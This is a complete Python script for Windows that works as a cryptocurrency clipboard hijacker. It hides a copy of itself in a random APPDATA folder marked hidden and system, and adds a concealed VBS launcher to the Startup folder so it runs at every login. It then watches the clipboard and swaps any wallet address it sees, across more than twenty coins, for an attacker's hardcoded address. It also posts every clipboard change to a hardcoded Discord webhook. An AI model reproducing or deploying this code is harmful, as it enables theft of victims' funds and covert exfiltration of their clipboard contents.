import pyperclip
import time
import re
import os
import random
import string
import shutil
import sys
import subprocess
import threading
import importlib
import requests

def install_library(library):
    try:
        importlib.import_module(library)
        send_discord_notification(f'Library {library} already installed')
    except ImportError:
        send_discord_notification(f'Installing library {library}')
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', library])
        send_discord_notification(f'Library {library} installed successfully')

def hide_program():
    appdata = os.getenv('APPDATA')
    random_folder = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    hide_path = os.path.join(appdata, random_folder)
    os.makedirs(hide_path, exist_ok=True)
    send_discord_notification(f'Created hidden folder: {hide_path}')
    current_script = sys.argv[0]
    hidden_script = os.path.join(hide_path, ''.join(random.choices(string.ascii_lowercase, k=10)) + '.pyw')
    shutil.copy(current_script, hidden_script)
    os.system(f'attrib +h +s "{hide_path}"')
    os.system(f'attrib +h +s "{hidden_script}"')
    send_discord_notification(f'Copied script to hidden path: {hidden_script}')
    return hidden_script

def add_to_startup(hidden_script):
    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    random_name = ''.join(random.choices(string.ascii_lowercase, k=8)) + '.vbs'
    vbs_path = os.path.join(startup, random_name)
    with open(vbs_path, 'w') as f:
        f.write(f'Set WShell = CreateObject("WScript.Shell")\nWShell.Run "pythonw ""{hidden_script}""", 0')
    os.system(f'attrib +h +s "{vbs_path}"')
    send_discord_notification(f'Added to startup: {vbs_path}')

def make_persistent():
    send_discord_notification('Starting persistence setup')
    hidden_script = hide_program()
    if sys.argv[0] != hidden_script:
        add_to_startup(hidden_script)
        send_discord_notification('Launching hidden script and exiting original')
        subprocess.Popen(['pythonw', hidden_script], creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit()
    send_discord_notification('Running from hidden script')

def send_discord_notification(message, thread_id=None):
    webhook_url = 'https://discord.com/api/webhooks/1413904009932177559/A25ugwZBZqSiEVOg_ZscIgojk_SQ6bLFKIXjidBx_UkhCNOK-nBvRNgFnrXLqH3NFpDP'
    data = {'content': message}
    if thread_id:
        data['thread_id'] = thread_id
    try:
        response = requests.post(webhook_url, json=data)
        send_discord_notification(f'Notification sent: {message}, Status: {response.status_code}')
    except Exception as e:
        pass

def monitor_clipboard():
    addresses = {
        'ETH': '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b',
        'BTC': 'bc1qzuelyf68hjd8qwhsm43ejpk538xnvd78zml5d3',
        'BNB': '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b',
        'XRP': 'rGU8BRSuY5YLNdUcXbrNu29EQHRCR8wRSo',
        'ADA': 'addr1qydvdugxkprrxsfxzf2r0amkz0syka5lm8spk4vgv9l0y7c6cmcsdvzxxdqjvyj5xlmhvylqfdmflk0qrd2csct77fasq5cfzg',
        'SOL': 'F7Lr2NjDPWPMJouTHV3kasePbiL4t1MrtCCMbUgCZXYj',
        'DOGE': 'DBBaxUBzXAZqnbaHZk8CbpZ6CVGmC1Euvn',
        'TRX': 'TQw5weBndhXq9mLkPDwBXeDWb7vcVDGTUk',
        'MATIC': '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b',
        'LTC': 'LX44QNxXmmnUsttkzdAgMubS6dQb7nHNha',
        'SHIB': '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b',
        'AVAX': '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b',
        'DAI': '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b',
        'UNI': '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b',
        'WBTC': '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b',
        'LINK': '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b',
        'XLM': 'GA6NFYTV4GMS7YW6UQHRGSTSXACYRUK4O3Q5IKMVA62SRA4VRNKNABEY',
        'ATOM': 'cosmos12d2at6hs2ewzksyfvt0a0fwqcvymm5zzj2648d',
        'ETC': '0x9575feD90Baa4eC492bb12efaA82D7d9A5c3d050',
        'XMR': '49JVqCvuipEbf5noo59mee1h7zJFhQsNQcsV3ZkUkDjDJWa8GgTV3NujCjhJGK7rSFcJacejPveGGg49fcHmHVRZ9MZGCAA',
        'USDT-ERC20': '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b',
        'USDC-ERC20': '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'
    }
    patterns = {
        'ETH': r'^0x[a-fA-F0-9]{40}$',
        'BTC': r'^(bc1[0-9a-zA-Z]{38,62}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$',
        'BNB': r'^0x[a-fA-F0-9]{40}$',
        'XRP': r'^r[0-9a-zA-Z]{33,34}$',
        'ADA': r'^addr1[0-9a-zA-Z]{98,104}$',
        'SOL': r'^[0-9a-zA-Z]{44}$',
        'DOGE': r'^D[0-9a-zA-Z]{33,34}$',
        'TRX': r'^T[0-9a-zA-Z]{33,34}$',
        'MATIC': r'^0x[a-fA-F0-9]{40}$',
        'LTC': r'^L[0-9a-zA-Z]{33,34}$',
        'SHIB': r'^0x[a-fA-F0-9]{40}$',
        'AVAX': r'^0x[a-fA-F0-9]{40}$',
        'DAI': r'^0x[a-fA-F0-9]{40}$',
        'UNI': r'^0x[a-fA-F0-9]{40}$',
        'WBTC': r'^0x[a-fA-F0-9]{40}$',
        'LINK': r'^0x[a-fA-F0-9]{40}$',
        'XLM': r'^G[0-9A-Z]{55}$',
        'ATOM': r'^cosmos1[0-9a-zA-Z]{38,44}$',
        'ETC': r'^0x[a-fA-F0-9]{40}$',
        'XMR': r'^4[0-9AB][0-9a-zA-Z]{93,104}$',
        'USDT-ERC20': r'^0x[a-fA-F0-9]{40}$',
        'USDC-ERC20': r'^0x[a-fA-F0-9]{40}$'
    }
    send_discord_notification('Starting clipboard monitoring')
    thread_id = None
    last_value = pyperclip.paste()
    send_discord_notification(f'Initial clipboard content: {last_value}')
    while True:
        current_value = pyperclip.paste()
        if current_value != last_value:
            send_discord_notification(f'Clipboard changed: {current_value}')
            for coin, pattern in patterns.items():
                if re.match(pattern, current_value):
                    pyperclip.copy(addresses[coin])
                    send_discord_notification(f'Replaced {coin} address: {current_value} with {addresses[coin]}', thread_id)
                    break
            last_value = current_value
        time.sleep(0.005)

if __name__ == '__main__':
    try:
        send_discord_notification('Script started')
        install_library('pyperclip')
        install_library('requests')
        make_persistent()
        monitor_clipboard()
    except KeyboardInterrupt:
        send_discord_notification('Script stopped by user')
        pass
    except Exception as e:
        send_discord_notification(f'Error occurred: {str(e)}')
        pass